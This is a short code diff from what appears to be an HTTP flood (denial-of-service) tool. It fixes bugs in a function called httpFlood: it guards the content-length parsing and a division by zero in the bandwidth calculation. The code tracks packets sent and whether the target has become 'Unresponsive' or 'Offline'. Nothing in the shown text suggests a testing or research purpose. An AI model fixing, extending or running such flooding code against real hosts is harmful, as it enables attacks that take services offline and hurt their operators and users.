@@ -36,7 +36,10 @@ async function httpFlood(target, duration, intensity) {
           })
           .then(response => {
             packetsSent++;
-            mbps += response.headers.get('content-length') / 1000000; // Add content length to mbps
+            const contentLength = response.headers.get('content-length');
+            if (contentLength) {
+              mbps += parseInt(contentLength) / 1000000;
+            }
             if (!response.ok) {
               targetStatus = 'Unresponsive';
             }
@@ -56,7 +59,9 @@ async function httpFlood(target, duration, intensity) {
     targetStatus = 'Offline';
   }
 
-  mbps = mbps / ((Date.now() - startTime) / 1000);
+  const elapsedTime = (Date.now() - startTime) / 1000;
+  mbps = elapsedTime > 0 ? mbps / elapsedTime : 0;
+
     if(isNaN(mbps) || !isFinite(mbps)){
         mbps = 0;
     }
